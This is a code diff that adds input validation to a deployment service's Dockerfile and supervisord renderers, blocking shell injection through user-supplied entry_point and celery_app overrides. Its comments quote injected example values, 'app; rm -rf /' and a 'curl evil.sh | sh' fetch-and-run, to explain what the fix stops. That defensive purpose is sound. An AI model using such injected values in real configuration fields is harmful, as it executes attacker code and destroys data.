@@ -15,6 +15,13 @@ from .types import DeploymentConfig
 
 from core.global_settings.config import MIRROR_DOCKER
 
+# Security: validate user-supplied celery_app + entry_point overrides
+# before they reach supervisord command= lines (which are parsed by sh).
+from deployments.common.security import (
+    validate_celery_app,
+    validate_shell_command,
+)
+
 
 # ---------------------------------------------------------------------------
 # Web commands
@@ -61,7 +68,10 @@ def _flask_web_command(
 
 def _celery_app_name(module: str, override: str | None = None) -> str:
     if override and str(override).strip():
-        return str(override).strip()
+        # SECURITY: validate before interpolation into supervisord command=.
+        # Without this, a value like "app; rm -rf /" would be executed
+        # by supervisord's sh -c parser.
+        return validate_celery_app(str(override).strip())
     parts = (module or "app").split(".")
     return parts[0] if parts else "app"
 
@@ -247,7 +257,19 @@ def _render_django(dockerfile_template, tar_stream, config, logger):
     use_celery = use_beat = False
     if config is not None:
         server_type_override = config.server_type or None
-        entry_point_override = (config.entry_point or "").strip() or None
+        # SECURITY: validate user-supplied entry_point override before it
+        # flows into supervisord command= or Dockerfile CMD.  Without this,
+        # a value like "gunicorn app:app; curl evil.sh | sh" would execute
+        # arbitrary shell commands inside the container at runtime.
+        _raw_ep = (config.entry_point or "").strip() or None
+        if _raw_ep:
+            try:
+                entry_point_override = validate_shell_command(_raw_ep)
+            except DeploymentValidationError:
+                # Re-raise with a clearer message
+                raise
+        else:
+            entry_point_override = None
         use_celery = bool(config.celery)
         use_beat = bool(config.celery_beat) and use_celery
 
@@ -354,7 +376,19 @@ def _render_flask_or_python(platform, dockerfile_template, tar_stream, config, l
     use_celery = use_beat = False
     if config is not None:
         server_type_override = config.server_type or None
-        entry_point_override = (config.entry_point or "").strip() or None
+        # SECURITY: validate user-supplied entry_point override before it
+        # flows into supervisord command= or Dockerfile CMD.  Without this,
+        # a value like "gunicorn app:app; curl evil.sh | sh" would execute
+        # arbitrary shell commands inside the container at runtime.
+        _raw_ep = (config.entry_point or "").strip() or None
+        if _raw_ep:
+            try:
+                entry_point_override = validate_shell_command(_raw_ep)
+            except DeploymentValidationError:
+                # Re-raise with a clearer message
+                raise
+        else:
+            entry_point_override = None
         use_celery = bool(config.celery)
         use_beat = bool(config.celery_beat) and use_celery
 
@@ -742,7 +776,19 @@ def _render_node_family(platform, dockerfile_template, tar_stream, config, logge
     """
     entry_point_override = None
     if config is not None:
-        entry_point_override = (config.entry_point or "").strip() or None
+        # SECURITY: validate user-supplied entry_point override before it
+        # flows into supervisord command= or Dockerfile CMD.  Without this,
+        # a value like "gunicorn app:app; curl evil.sh | sh" would execute
+        # arbitrary shell commands inside the container at runtime.
+        _raw_ep = (config.entry_point or "").strip() or None
+        if _raw_ep:
+            try:
+                entry_point_override = validate_shell_command(_raw_ep)
+            except DeploymentValidationError:
+                # Re-raise with a clearer message
+                raise
+        else:
+            entry_point_override = None
 
     project_cfg = None
     try:
@@ -1093,7 +1139,19 @@ def _apply_php_document_root(dockerfile: str, document_root_rel: str) -> str:
 def _render_php(dockerfile_template, tar_stream, config, logger):
     entry_point_override = None
     if config is not None:
-        entry_point_override = (config.entry_point or "").strip() or None
+        # SECURITY: validate user-supplied entry_point override before it
+        # flows into supervisord command= or Dockerfile CMD.  Without this,
+        # a value like "gunicorn app:app; curl evil.sh | sh" would execute
+        # arbitrary shell commands inside the container at runtime.
+        _raw_ep = (config.entry_point or "").strip() or None
+        if _raw_ep:
+            try:
+                entry_point_override = validate_shell_command(_raw_ep)
+            except DeploymentValidationError:
+                # Re-raise with a clearer message
+                raise
+        else:
+            entry_point_override = None
 
     rendered = dockerfile_template.replace("{MIRROR_DOCKER}", MIRROR_DOCKER)
 
@@ -1159,7 +1217,19 @@ def _render_php(dockerfile_template, tar_stream, config, logger):
 def _render_generic(platform, dockerfile_template, tar_stream, config, logger):
     entry_point_override = None
     if config is not None:
-        entry_point_override = (config.entry_point or "").strip() or None
+        # SECURITY: validate user-supplied entry_point override before it
+        # flows into supervisord command= or Dockerfile CMD.  Without this,
+        # a value like "gunicorn app:app; curl evil.sh | sh" would execute
+        # arbitrary shell commands inside the container at runtime.
+        _raw_ep = (config.entry_point or "").strip() or None
+        if _raw_ep:
+            try:
+                entry_point_override = validate_shell_command(_raw_ep)
+            except DeploymentValidationError:
+                # Re-raise with a clearer message
+                raise
+        else:
+            entry_point_override = None
     rendered = dockerfile_template.replace("{MIRROR_DOCKER}", MIRROR_DOCKER)
     if entry_point_override:
         rendered = _replace_cmd(rendered, entry_point_override)
